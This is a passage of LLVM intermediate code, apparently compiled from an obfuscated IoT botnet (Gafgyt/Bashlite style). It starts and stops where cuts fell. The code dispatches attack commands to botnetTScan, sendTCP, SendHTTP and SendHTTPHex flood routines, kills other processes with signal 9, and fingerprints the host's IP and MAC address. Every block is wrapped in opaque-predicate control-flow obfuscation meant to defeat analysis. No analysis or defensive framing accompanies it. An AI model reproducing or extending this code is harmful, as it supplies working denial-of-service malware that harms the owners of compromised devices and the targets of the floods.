  %1115 = icmp eq i32 %1114, 0
  %1116 = icmp slt i32 %1111, 10
  %1117 = or i1 %1115, %1116
  br i1 %1117, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br label %1118

; <label>:1118:                                   ; preds = %originalBBpart2148, %originalBBpart2124
  %1119 = load i8**, i8*** %4, align 8
  %1120 = getelementptr inbounds i8*, i8** %1119, i64 0
  %1121 = load i8*, i8** %1120, align 8
  %1122 = call i32 @strcmp(i8* %1121, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.160, i32 0, i32 0)) #9
  %1123 = icmp ne i32 %1122, 0
  br i1 %1123, label %1171, label %1124

; <label>:1124:                                   ; preds = %1118
  store i32 0, i32* %29, align 4
  store i64 0, i64* %30, align 8
  br label %1125

; <label>:1125:                                   ; preds = %1167, %1124
  %1126 = load i64, i64* %30, align 8
  %1127 = load i64, i64* @numpids, align 8
  %1128 = icmp ult i64 %1126, %1127
  br i1 %1128, label %1129, label %1170

; <label>:1129:                                   ; preds = %1125
  %1130 = load i32*, i32** @pids, align 8
  %1131 = load i64, i64* %30, align 8
  %1132 = getelementptr inbounds i32, i32* %1130, i64 %1131
  %1133 = load i32, i32* %1132, align 4
  %1134 = icmp ne i32 %1133, 0
  br i1 %1134, label %1135, label %1150

; <label>:1135:                                   ; preds = %1129
  %1136 = load i32*, i32** @pids, align 8
  %1137 = load i64, i64* %30, align 8
  %1138 = getelementptr inbounds i32, i32* %1136, i64 %1137
  %1139 = load i32, i32* %1138, align 4
  %1140 = call i32 @getpid() #3
  %1141 = icmp ne i32 %1139, %1140
  br i1 %1141, label %1142, label %1150

; <label>:1142:                                   ; preds = %1135
  %1143 = load i32*, i32** @pids, align 8
  %1144 = load i64, i64* %30, align 8
  %1145 = getelementptr inbounds i32, i32* %1143, i64 %1144
  %1146 = load i32, i32* %1145, align 4
  %1147 = call i32 @kill(i32 %1146, i32 9) #3
  %1148 = load i32, i32* %29, align 4
  %1149 = add nsw i32 %1148, 1
  store i32 %1149, i32* %29, align 4
  br label %1150

; <label>:1150:                                   ; preds = %1142, %1135, %1129
  %1151 = load i32, i32* @x.93
  %1152 = load i32, i32* @y.94
  %1153 = sub i32 %1151, 1
  %1154 = mul i32 %1151, %1153
  %1155 = urem i32 %1154, 2
  %1156 = icmp eq i32 %1155, 0
  %1157 = icmp slt i32 %1152, 10
  %1158 = or i1 %1156, %1157
  br i1 %1158, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1150
  %1159 = load i32, i32* @x.93
  %1160 = load i32, i32* @y.94
  %1161 = sub i32 %1159, 1
  %1162 = mul i32 %1159, %1161
  %1163 = urem i32 %1162, 2
  %1164 = icmp eq i32 %1163, 0
  %1165 = icmp slt i32 %1160, 10
  %1166 = or i1 %1164, %1165
  br i1 %1166, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %1167

; <label>:1167:                                   ; preds = %originalBBpart2152
  %1168 = load i64, i64* %30, align 8
  %1169 = add i64 %1168, 1
  store i64 %1169, i64* %30, align 8
  br label %1125

; <label>:1170:                                   ; preds = %1125
  br label %1171

; <label>:1171:                                   ; preds = %1170, %1118, %1096, %originalBBpart2136, %904, %originalBBpart2116, %823, %819, %594, %478, %294, %originalBBpart216, %111, %originalBBpart28, %77
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %36
  %1172 = load i8**, i8*** %4, align 8
  %1173 = getelementptr inbounds i8*, i8** %1172, i64 1
  %1174 = load i8*, i8** %1173, align 8
  %1175 = call i32 @strcmp(i8* %1174, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.153, i32 0, i32 0)) #9
  %1176 = icmp ne i32 %1175, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %58
  %1177 = load i32, i32* @botnetPid, align 4
  %1178 = icmp eq i32 %1177, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %90
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %113
  %1179 = load i32, i32* %5, align 4
  %1180 = icmp eq i32 %1179, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %132
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %150
  %1181 = load i32, i32* %7, align 4
  %1182 = load i32, i32* %6, align 4
  call void @botnetTScan(i32 %1181, i32 %1182)
  call void @_exit(i32 0) #12
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %169
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %186
  %1183 = load i8**, i8*** %4, align 8
  %1184 = getelementptr inbounds i8*, i8** %1183, i64 0
  %1185 = load i8*, i8** %1184, align 8
  %1186 = call i32 @strcmp(i8* %1185, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.155, i32 0, i32 0)) #9
  %1187 = icmp ne i32 %1186, 0
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %217
  %1188 = load i8**, i8*** %4, align 8
  %1189 = getelementptr inbounds i8*, i8** %1188, i64 2
  %1190 = load i8*, i8** %1189, align 8
  %1191 = call i32 @atoi(i8* %1190) #9
  %1192 = icmp eq i32 %1191, -1
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %269
  %1193 = load i32, i32* %3, align 4
  %1194 = icmp eq i32 %1193, 7
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %317
  %1195 = load i8**, i8*** %4, align 8
  %1196 = getelementptr inbounds i8*, i8** %1195, i64 6
  %1197 = load i8*, i8** %1196, align 8
  %1198 = call i32 @atoi(i8* %1197) #9
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %343
  %1199 = load i8**, i8*** %4, align 8
  %1200 = getelementptr inbounds i8*, i8** %1199, i64 7
  %1201 = load i8*, i8** %1200, align 8
  %1202 = call i32 @atoi(i8* %1201) #9
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %374
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %402
  %1203 = call i32 @listFork()
  %1204 = icmp ne i32 %1203, 0
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %430
  %1205 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %1205, i8** %16, align 8
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %449
  %1206 = call i32 @listFork()
  %1207 = icmp ne i32 %1206, 0
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %479
  %1208 = load i8**, i8*** %4, align 8
  %1209 = getelementptr inbounds i8*, i8** %1208, i64 0
  %1210 = load i8*, i8** %1209, align 8
  %1211 = call i32 @strcmp(i8* %1210, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.156, i32 0, i32 0)) #9
  %1212 = icmp ne i32 %1211, 0
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %501
  %1213 = load i32, i32* %3, align 4
  %1214 = icmp slt i32 %1213, 6
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %544
  %1215 = load i32, i32* %3, align 4
  %1216 = icmp sgt i32 %1215, 6
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %572
  %1217 = load i8**, i8*** %4, align 8
  %1218 = getelementptr inbounds i8*, i8** %1217, i64 7
  %1219 = load i8*, i8** %1218, align 8
  %1220 = call i32 @atoi(i8* %1219) #9
  %1221 = icmp slt i32 %1220, 1
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %595
  %1222 = load i8**, i8*** %4, align 8
  %1223 = getelementptr inbounds i8*, i8** %1222, i64 1
  %1224 = load i8*, i8** %1223, align 8
  store i8* %1224, i8** %17, align 8
  %1225 = load i8**, i8*** %4, align 8
  %1226 = getelementptr inbounds i8*, i8** %1225, i64 2
  %1227 = load i8*, i8** %1226, align 8
  %1228 = call i32 @atoi(i8* %1227) #9
  store i32 %1228, i32* %18, align 4
  %1229 = load i8**, i8*** %4, align 8
  %1230 = getelementptr inbounds i8*, i8** %1229, i64 3
  %1231 = load i8*, i8** %1230, align 8
  %1232 = call i32 @atoi(i8* %1231) #9
  store i32 %1232, i32* %19, align 4
  %1233 = load i8**, i8*** %4, align 8
  %1234 = getelementptr inbounds i8*, i8** %1233, i64 4
  %1235 = load i8*, i8** %1234, align 8
  %1236 = call i32 @atoi(i8* %1235) #9
  store i32 %1236, i32* %20, align 4
  %1237 = load i8**, i8*** %4, align 8
  %1238 = getelementptr inbounds i8*, i8** %1237, i64 5
  %1239 = load i8*, i8** %1238, align 8
  store i8* %1239, i8** %21, align 8
  %1240 = load i32, i32* %3, align 4
  %1241 = icmp eq i32 %1240, 8
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %632
  %1242 = load i8**, i8*** %4, align 8
  %1243 = getelementptr inbounds i8*, i8** %1242, i64 7
  %1244 = load i8*, i8** %1243, align 8
  %1245 = call i32 @atoi(i8* %1244) #9
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %653
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %674
  %1246 = load i8**, i8*** %4, align 8
  %1247 = getelementptr inbounds i8*, i8** %1246, i64 6
  %1248 = load i8*, i8** %1247, align 8
  %1249 = call i32 @atoi(i8* %1248) #9
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %695
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %726
  %1250 = load i8*, i8** %24, align 8
  %1251 = load i32, i32* %18, align 4
  %1252 = load i32, i32* %19, align 4
  %1253 = load i32, i32* %20, align 4
  %1254 = load i8*, i8** %21, align 8
  %1255 = load i32, i32* %23, align 4
  %1256 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %1250, i32 %1251, i32 %1252, i32 %1253, i8* %1254, i32 %1255, i32 %1256)
  call void @_exit(i32 0) #12
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %750
  %1257 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %1257, i8** %24, align 8
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %788
  %1258 = load i32, i32* %3, align 4
  %1259 = icmp slt i32 %1258, 6
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %824
  %1260 = load i8**, i8*** %4, align 8
  %1261 = getelementptr inbounds i8*, i8** %1260, i64 1
  %1262 = load i8*, i8** %1261, align 8
  %1263 = load i8**, i8*** %4, align 8
  %1264 = getelementptr inbounds i8*, i8** %1263, i64 2
  %1265 = load i8*, i8** %1264, align 8
  %1266 = load i8**, i8*** %4, align 8
  %1267 = getelementptr inbounds i8*, i8** %1266, i64 3
  %1268 = load i8*, i8** %1267, align 8
  %1269 = call i32 @atoi(i8* %1268) #9
  %1270 = trunc i32 %1269 to i16
  %1271 = load i8**, i8*** %4, align 8
  %1272 = getelementptr inbounds i8*, i8** %1271, i64 4
  %1273 = load i8*, i8** %1272, align 8
  %1274 = load i8**, i8*** %4, align 8
  %1275 = getelementptr inbounds i8*, i8** %1274, i64 5
  %1276 = load i8*, i8** %1275, align 8
  %1277 = call i32 @atoi(i8* %1276) #9
  %1278 = load i8**, i8*** %4, align 8
  %1279 = getelementptr inbounds i8*, i8** %1278, i64 6
  %1280 = load i8*, i8** %1279, align 8
  %1281 = call i32 @atoi(i8* %1280) #9
  call void @SendHTTP(i8* %1262, i8* %1265, i16 zeroext %1270, i8* %1273, i32 %1277, i32 %1281)
  call void @exit(i32 0) #11
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %884
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %905
  %1282 = load i8**, i8*** %4, align 8
  %1283 = getelementptr inbounds i8*, i8** %1282, i64 1
  %1284 = load i8*, i8** %1283, align 8
  %1285 = load i8**, i8*** %4, align 8
  %1286 = getelementptr inbounds i8*, i8** %1285, i64 2
  %1287 = load i8*, i8** %1286, align 8
  %1288 = load i8**, i8*** %4, align 8
  %1289 = getelementptr inbounds i8*, i8** %1288, i64 3
  %1290 = load i8*, i8** %1289, align 8
  %1291 = call i32 @atoi(i8* %1290) #9
  %1292 = trunc i32 %1291 to i16
  %1293 = load i8**, i8*** %4, align 8
  %1294 = getelementptr inbounds i8*, i8** %1293, i64 4
  %1295 = load i8*, i8** %1294, align 8
  %1296 = load i8**, i8*** %4, align 8
  %1297 = getelementptr inbounds i8*, i8** %1296, i64 5
  %1298 = load i8*, i8** %1297, align 8
  %1299 = call i32 @atoi(i8* %1298) #9
  %1300 = load i8**, i8*** %4, align 8
  %1301 = getelementptr inbounds i8*, i8** %1300, i64 6
  %1302 = load i8*, i8** %1301, align 8
  %1303 = call i32 @atoi(i8* %1302) #9
  call void @SendHTTPHex(i8* %1284, i8* %1287, i16 zeroext %1292, i8* %1295, i32 %1299, i32 %1303)
  call void @exit(i32 0) #11
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %944
  %1304 = load i8**, i8*** %4, align 8
  %1305 = getelementptr inbounds i8*, i8** %1304, i64 0
  %1306 = load i8*, i8** %1305, align 8
  %1307 = call i32 @strcmp(i8* %1306, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.159, i32 0, i32 0)) #9
  %1308 = icmp ne i32 %1307, 0
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %966
  %1309 = load i32, i32* %3, align 4
  %1310 = icmp slt i32 %1309, 4
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %991
  %1311 = load i8**, i8*** %4, align 8
  %1312 = getelementptr inbounds i8*, i8** %1311, i64 3
  %1313 = load i8*, i8** %1312, align 8
  %1314 = call i32 @atoi(i8* %1313) #9
  %1315 = icmp slt i32 %1314, 1
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1013
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1058
  %1316 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #3
  store i8* %1316, i8** %28, align 8
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1076
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1101
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1150
  br label %originalBB150
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #5

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = load i32, i32* @x.95
  %2 = load i32, i32* @y.96
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [4096 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca %struct.ifreq, align 8
  %20 = call i32 @socket(i32 2, i32 2, i32 0) #3
  store i32 %20, i32* %10, align 4
  %21 = load i32, i32* %10, align 4
  %22 = icmp eq i32 %21, -1
  %23 = load i32, i32* @x.95
  %24 = load i32, i32* @y.96
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %32

; <label>:31:                                     ; preds = %originalBBpart2
  store i32 0, i32* %9, align 4
  br label %229

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* @x.95
  %34 = load i32, i32* @y.96
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 16, i32 4, i1 false)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.161, i32 0, i32 0)) #3
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  store i32 %43, i32* %45, align 4
  %46 = call zeroext i16 @htons(i16 zeroext 53) #10
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %46, i16* %47, align 2
  %48 = load i32, i32* %10, align 4
  %49 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %50 = call i32 @connect(i32 %48, %struct.sockaddr* %49, i32 16)
  store i32 %50, i32* %12, align 4
  %51 = load i32, i32* %12, align 4
  %52 = icmp eq i32 %51, -1
  %53 = load i32, i32* @x.95
  %54 = load i32, i32* @y.96
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %52, label %61, label %62

; <label>:61:                                     ; preds = %originalBBpart24
  store i32 0, i32* %9, align 4
  br label %229

; <label>:62:                                     ; preds = %originalBBpart24
  %63 = load i32, i32* @x.95
  %64 = load i32, i32* @y.96
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %62
  store i32 16, i32* %14, align 4
  %71 = load i32, i32* %10, align 4
  %72 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %73 = call i32 @getsockname(i32 %71, %struct.sockaddr* %72, i32* %14) #3
  store i32 %73, i32* %12, align 4
  %74 = load i32, i32* %12, align 4
  %75 = icmp eq i32 %74, -1
  %76 = load i32, i32* @x.95
  %77 = load i32, i32* @y.96
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %75, label %84, label %85

; <label>:84:                                     ; preds = %originalBBpart28
  store i32 0, i32* %9, align 4
  br label %229

; <label>:85:                                     ; preds = %originalBBpart28
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %87 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 4
  store i32 %88, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %89 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.162, i32 0, i32 0), i32 0)
  store i32 %89, i32* %15, align 4
  br label %90

; <label>:90:                                     ; preds = %143, %85
  %91 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %92 = load i32, i32* %15, align 4
  %93 = call i8* @fdgets(i8* %91, i32 4096, i32 %92)
  %94 = icmp ne i8* %93, null
  br i1 %94, label %95, label %145

; <label>:95:                                     ; preds = %90
  %96 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %97 = call i8* @strstr(i8* %96, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.163, i32 0, i32 0)) #9
  %98 = icmp ne i8* %97, null
  br i1 %98, label %99, label %143

; <label>:99:                                     ; preds = %95
  %100 = load i32, i32* @x.95
  %101 = load i32, i32* @y.96
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %99
  %108 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  store i8* %108, i8** %17, align 8
  %109 = load i32, i32* @x.95
  %110 = load i32, i32* @y.96
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %117

; <label>:117:                                    ; preds = %138, %originalBBpart212
  %118 = load i32, i32* @x.95
  %119 = load i32, i32* @y.96
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %117
  %126 = load i8*, i8** %17, align 8
  %127 = load i8, i8* %126, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp ne i32 %128, 9
  %130 = load i32, i32* @x.95
  %131 = load i32, i32* @y.96
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %129, label %138, label %141

; <label>:138:                                    ; preds = %originalBBpart216
  %139 = load i8*, i8** %17, align 8
  %140 = getelementptr inbounds i8, i8* %139, i32 1
  store i8* %140, i8** %17, align 8
  br label %117

; <label>:141:                                    ; preds = %originalBBpart216
  %142 = load i8*, i8** %17, align 8
  store i8 0, i8* %142, align 1
  br label %145

; <label>:143:                                    ; preds = %95
  %144 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %144, i8 0, i64 4096, i32 16, i1 false)
  br label %90

; <label>:145:                                    ; preds = %141, %90
  %146 = load i32, i32* %15, align 4
  %147 = call i32 @close(i32 %146)
  %148 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %149 = load i8, i8* %148, align 16
  %150 = icmp ne i8 %149, 0
  br i1 %150, label %151, label %210

; <label>:151:                                    ; preds = %145
  %152 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %19, i32 0, i32 0
  %153 = bitcast %union.anon.4* %152 to [16 x i8]*
  %154 = getelementptr inbounds [16 x i8], [16 x i8]* %153, i32 0, i32 0
  %155 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i32 0, i32 0
  %156 = call i8* @strcpy(i8* %154, i8* %155) #3
  %157 = load i32, i32* %10, align 4
  %158 = call i32 (i32, i64, ...) @ioctl(i32 %157, i64 35111, %struct.ifreq* %19) #3
  store i32 0, i32* %18, align 4
  br label %159

; <label>:159:                                    ; preds = %originalBBpart223, %151
  %160 = load i32, i32* %18, align 4
  %161 = icmp slt i32 %160, 6
  br i1 %161, label %162, label %193

; <label>:162:                                    ; preds = %159
  %163 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %19, i32 0, i32 1
  %164 = bitcast %union.anon.5* %163 to %struct.sockaddr*
  %165 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %164, i32 0, i32 1
  %166 = getelementptr inbounds [14 x i8], [14 x i8]* %165, i32 0, i32 0
  %167 = load i32, i32* %18, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i8, i8* %166, i64 %168
  %170 = load i8, i8* %169, align 1
  %171 = load i32, i32* %18, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %172
  store i8 %170, i8* %173, align 1
  br label %174

; <label>:174:                                    ; preds = %162
  %175 = load i32, i32* @x.95
  %176 = load i32, i32* @y.96
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %174
  %183 = load i32, i32* %18, align 4
  %184 = add nsw i32 %183, 1
  store i32 %184, i32* %18, align 4
  %185 = load i32, i32* @x.95
  %186 = load i32, i32* @y.96
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBBpart223, label %originalBB18alteredBB

originalBBpart223:                                ; preds = %originalBB18
  br label %159

; <label>:193:                                    ; preds = %159
  %194 = load i32, i32* @x.95
  %195 = load i32, i32* @y.96
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %193
  %202 = load i32, i32* @x.95
  %203 = load i32, i32* @y.96
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %210

; <label>:210:                                    ; preds = %originalBBpart227, %145
  %211 = load i32, i32* @x.95
  %212 = load i32, i32* @y.96
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %210
  %219 = load i32, i32* %10, align 4
  %220 = call i32 @close(i32 %219)
  %221 = load i32, i32* @x.95
  %222 = load i32, i32* @y.96
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %229

; <label>:229:                                    ; preds = %originalBBpart231, %84, %61, %31
  %230 = load i32, i32* %9, align 4
  ret i32 %230

originalBBalteredBB:                              ; preds = %originalBB, %0
  %231 = alloca i32, align 4
  %232 = alloca i32, align 4
  %233 = alloca %struct.sockaddr_in, align 4
  %234 = alloca i32, align 4
  %235 = alloca %struct.sockaddr_in, align 4
  %236 = alloca i32, align 4
  %237 = alloca i32, align 4
  %238 = alloca [4096 x i8], align 16
  %239 = alloca i8*, align 8
  %240 = alloca i32, align 4
  %241 = alloca %struct.ifreq, align 8
  %242 = call i32 @socket(i32 2, i32 2, i32 0) #3
  store i32 %242, i32* %232, align 4
  %243 = load i32, i32* %232, align 4
  %244 = icmp eq i32 %243, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  %245 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %245, i8 0, i64 16, i32 4, i1 false)
  %246 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 2, i16* %246, align 4
  %247 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.161, i32 0, i32 0)) #3
  %248 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %249 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %248, i32 0, i32 0
  store i32 %247, i32* %249, align 4
  %250 = call zeroext i16 @htons(i16 zeroext 53) #10
  %251 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %250, i16* %251, align 2
  %252 = load i32, i32* %10, align 4
  %253 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %254 = call i32 @connect(i32 %252, %struct.sockaddr* %253, i32 16)
  store i32 %254, i32* %12, align 4
  %255 = load i32, i32* %12, align 4
  %256 = icmp eq i32 %255, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %62
  store i32 16, i32* %14, align 4
